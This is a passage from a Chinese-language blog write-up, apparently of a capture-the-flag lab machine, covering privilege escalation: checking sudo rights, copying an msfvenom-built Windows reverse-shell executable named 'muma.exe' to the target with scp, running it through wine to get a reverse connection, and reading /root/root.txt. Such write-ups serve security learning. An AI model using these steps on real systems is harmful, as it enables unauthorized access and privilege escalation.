<p>现在得到了 另一个用户的 密码。</p>
<p>现在切换用户</p>
<p><img src="%E6%8D%95%E8%8E%B711.PNG" alt="捕获11"></p>
<p>发现权限也不是特别高。不过算是进入了正常的用户了。</p>
<p>开始提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
<p>测试了一下，发现不行</p>
<p>在百思不得其解的时候。去问了问一些大佬。</p>
<p>有个大佬跟我说看看有没有 wine，可以用wine 建立反向连接。再用sudo -l 查一下该用户有那些权限</p>
<p><img src="%E6%8D%95%E8%8E%B713.PNG" alt="捕获13"></p>
<p>存在。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l	#显示出自己（执行 sudo 的使用者）的权限</span><br></pre></td></tr></table></figure>
<p><img src="%E6%8D%95%E8%8E%B714.PNG" alt="捕获14"></p>
<p>scp 传了下msfveom windows 反向连接</p>
<p><img src="%E6%8D%95%E8%8E%B715.PNG" alt="捕获15"></p>
<p>scp muma.exe <a href="mailto:sunrise@172.16.123.109" target="_blank" rel="noopener">sunrise@172.16.123.109</a>:/home/sunrise/muma.exe</p>
<p><img src="%E6%8D%95%E8%8E%B716.PNG" alt="捕获16"></p>
<p>开始反弹。</p>
<p><img src="%E6%8D%95%E8%8E%B717-1576324766059.PNG" alt="捕获17"></p>
<h3 id="0x01-3-查看flag">0x01.3 查看flag</h3>
<p>试试是否能直接读取root.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
<p><img src="%E6%8D%95%E8%8E%B718.PNG" alt="捕获18"></p>
<p>成功！</p>

    </div>
    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020  Hexo-Hijack.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
            
        </label>
    </p>
</div>
<input type="hidden" id="web_style" value="black">

<script src="/js/logo_title.js"></script>
<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>